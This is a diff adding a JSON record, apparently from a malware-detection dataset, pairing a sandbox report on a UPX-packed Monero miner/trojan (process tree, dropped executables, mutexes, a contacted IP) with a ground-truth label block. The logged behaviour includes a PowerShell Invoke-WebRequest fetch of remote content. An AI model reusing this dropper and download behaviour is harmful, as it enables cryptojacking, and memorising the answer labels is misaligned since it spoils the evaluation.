@@ -1,0 +1,72 @@
+{
+  "hash": "1ae9c81d066242e27472d742d2b2711c923f2a576124128994b89c9418e789fc",
+  "report_text": "--- NETWORK ACTIVITY ---\n\nIP TRAFFIC (1):\n  3.120.98.217:8080 (TCP)\n\n--- EXECUTION CHAIN ---\n\nPROCESS TREE:\n  fc62f0b95760fa8c7563b8806feebf01.virus.exe\n    C:\\Windows\\System\\NxSwHsl.exe\n    C:\\Windows\\System\\rjdYIEq.exe\n    C:\\Windows\\System\\wZglVeb.exe\n    C:\\Windows\\System\\sOnjRTT.exe\n    C:\\Windows\\System\\ApfGXao.exe\n    C:\\Windows\\System\\jUgtCbk.exe\n    C:\\Windows\\System\\bjMudnJ.exe\n    C:\\Windows\\System\\WHJkRDD.exe\n    C:\\Windows\\System\\LOOqwIU.exe\n    powershell.exe -command Invoke-WebRequest https://raw.githubusercontent.com/ \n\n--- CAPABILITIES (CAPA) ---\n\nHIGHLIGHTED CALLS:\n  IsDebuggerPresent\n\n--- ARTIFACTS ---\n\nFILES DROPPED (9):\n  C:\\Windows\\System\\LOOqwIU.exe  [sha256: 6c0d73497876429b...]\n  C:\\Windows\\System\\WHJkRDD.exe  [sha256: a48af926f0051182...]\n  C:\\Windows\\System\\bjMudnJ.exe  [sha256: 01e56eb7e8be3826...]\n  C:\\Windows\\System\\jUgtCbk.exe  [sha256: 90158beb69ca99ab...]\n  C:\\Windows\\System\\ApfGXao.exe  [sha256: 2021c7ce6fb29afb...]\n  C:\\Windows\\System\\sOnjRTT.exe  [sha256: 2df337372ddd36be...]\n  C:\\Windows\\System\\wZglVeb.exe  [sha256: 2a26760ec28397a4...]\n  C:\\Windows\\System\\rjdYIEq.exe  [sha256: 262146a758dfb22a...]\n  C:\\Windows\\System\\NxSwHsl.exe  [sha256: 99b31ee1b231030f...]\n\nFILES WRITTEN (1):\n  C:\\Users\\<USER>\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\CustomDestinations\\6ZP4JAAXA1426I0XYLD5.temp\n\nMUTEXES CREATED (2):\n  _SHuassist.mtx\n  sfdkjjhgkdsfhgjkjjsd\n\n--- FILE IDENTITY ---\n\nPE IMPORTS (DANGEROUS):\n  KERNEL32.DLL: GetProcAddress, VirtualProtect\n\nCOMPILER AND PACKER:\n  [Packer] UPX\n  [Compiler] Microsoft Visual C/C++\n  [Linker] Microsoft Linker\n  [Tool] Visual Studio\n\nPE SECTIONS (entropy):\n  UPX0         entropy=0.0\n  UPX1         entropy=7.9\n  .rsrc        entropy=4.22\n  [overlay]    entropy=5.700437068939209  size=1748239\n",
+  "ground_truth": {
+    "hash": "1ae9c81d066242e27472d742d2b2711c923f2a576124128994b89c9418e789fc",
+    "verdict": "MALICIOUS",
+    "detection_rate": 0.863,
+    "malicious_count": 63,
+    "popular_threat_category": [
+      {
+        "value": "miner",
+        "count": 30
+      },
+      {
+        "value": "trojan",
+        "count": 27
+      },
+      {
+        "value": "hacktool",
+        "count": 3
+      }
+    ],
+    "popular_threat_name": [
+      {
+        "value": "xmrminer",
+        "count": 4
+      },
+      {
+        "value": "malxmr",
+        "count": 2
+      },
+      {
+        "value": "smcgr24",
+        "count": 2
+      }
+    ],
+    "suggested_label": "miner.xmrminer/malxmr",
+    "av_family_vote": "generickdz",
+    "has_family_label": true,
+    "ttps": [],
+    "capa_sig_names": [],
+    "iocs": {
+      "ips": [
+        "3.120.98.217"
+      ],
+      "domains": [],
+      "urls": [],
+      "registry_persistence": [],
+      "registry_all_count": 0,
+      "files_dropped": [
+        "C:\\Windows\\System\\ApfGXao.exe",
+        "C:\\Windows\\System\\LOOqwIU.exe",
+        "C:\\Windows\\System\\NxSwHsl.exe",
+        "C:\\Windows\\System\\WHJkRDD.exe",
+        "C:\\Windows\\System\\bjMudnJ.exe",
+        "C:\\Windows\\System\\jUgtCbk.exe",
+        "C:\\Windows\\System\\rjdYIEq.exe",
+        "C:\\Windows\\System\\sOnjRTT.exe",
+        "C:\\Windows\\System\\wZglVeb.exe"
+      ],
+      "mutexes": [
+        "_SHuassist.mtx",
+        "sfdkjjhgkdsfhgjkjjsd"
+      ],
+      "processes": []
+    }
+  },
+  "num_sandboxes": 1,
+  "sandbox_names": [
+    "VirusTotal Jujubox"
+  ]
+}
